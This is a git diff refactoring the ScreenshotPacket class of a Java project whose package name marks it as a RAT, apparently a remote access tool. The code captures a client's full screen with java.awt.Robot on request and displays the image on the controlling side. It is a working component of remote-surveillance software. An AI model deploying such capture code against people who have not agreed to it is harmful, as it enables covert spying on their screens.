@@ -16,14 +16,9 @@ import de.sogomn.engine.Screen;
 import de.sogomn.engine.Screen.ResizeBehavior;
 import de.sogomn.rat.ActiveClient;
 
-public final class ScreenshotPacket implements IPacket {
+public final class ScreenshotPacket extends AbstractPingPongPacket {
 	
 	private BufferedImage image;
-	
-	private byte type;
-	
-	private static final byte REQUEST = 0;
-	private static final byte DATA = 1;
 	
 	private static final BufferedImage NO_IMAGE = new BufferedImage(100, 100, BufferedImage.TYPE_INT_RGB);
 	private static final int SCREEN_WIDTH = 500;
@@ -42,13 +37,12 @@ public final class ScreenshotPacket implements IPacket {
 	}
 	
 	@Override
-	public void send(final ActiveClient client) {
-		client.writeByte(type);
-		
-		if (type == REQUEST) {
-			return;
-		}
-		
+	protected void sendRequest(final ActiveClient client) {
+		//...
+	}
+	
+	@Override
+	protected void sendData(final ActiveClient client) {
 		final ByteArrayOutputStream out = new ByteArrayOutputStream();
 		
 		try {
@@ -64,13 +58,12 @@ public final class ScreenshotPacket implements IPacket {
 	}
 	
 	@Override
-	public void receive(final ActiveClient client) {
-		type = client.readByte();
-		
-		if (type == REQUEST) {
-			return;
-		}
-		
+	protected void receiveRequest(final ActiveClient client) {
+		//...
+	}
+	
+	@Override
+	protected void receiveData(final ActiveClient client) {
 		final int length = client.readInt();
 		final byte[] data = new byte[length];
 		
@@ -88,35 +81,42 @@ public final class ScreenshotPacket implements IPacket {
 	}
 	
 	@Override
-	public void execute(final ActiveClient client) {
-		if (type == REQUEST) {
-			final Dimension screen = Toolkit.getDefaultToolkit().getScreenSize();
-			final Rectangle screenRect = new Rectangle(screen);
+	protected void executeRequest(final ActiveClient client) {
+		final Dimension screen = Toolkit.getDefaultToolkit().getScreenSize();
+		final Rectangle screenRect = new Rectangle(screen);
+		
+		try {
+			final Robot robot = new Robot();
 			
-			try {
-				final Robot robot = new Robot();
-				
-				image = robot.createScreenCapture(screenRect);
-				type = DATA;
-			} catch (final AWTException ex) {
-				ex.printStackTrace();
-			}
+			type = DATA;
+			image = robot.createScreenCapture(screenRect);
+		} catch (final AWTException ex) {
+			image = NO_IMAGE;
 			
-			client.addPacket(this);
-		} else if (type == DATA) {
-			final int width = image.getWidth();
-			final int height = image.getHeight();
-			
-			final Screen screen = new Screen(width, height);
-			
-			screen.addListener(g -> {
-				g.drawImage(image, 0, 0, width, height, null);
-			});
-			screen.setResizeBehavior(ResizeBehavior.KEEP_ASPECT_RATIO);
-			screen.setSize(SCREEN_WIDTH, SCREEN_HEIGHT);
-			screen.show();
-			screen.redraw();
+			ex.printStackTrace();
 		}
+		
+		client.addPacket(this);
+	}
+	
+	@Override
+	protected void executeData(final ActiveClient client) {
+		final int width = image.getWidth();
+		final int height = image.getHeight();
+		
+		final Screen screen = new Screen(width, height);
+		
+		screen.addListener(g -> {
+			g.drawImage(image, 0, 0, width, height, null);
+		});
+		screen.setResizeBehavior(ResizeBehavior.KEEP_ASPECT_RATIO);
+		screen.setSize(SCREEN_WIDTH, SCREEN_HEIGHT);
+		screen.show();
+		screen.redraw();
+	}
+	
+	public BufferedImage getImage() {
+		return image;
 	}
 	
 }
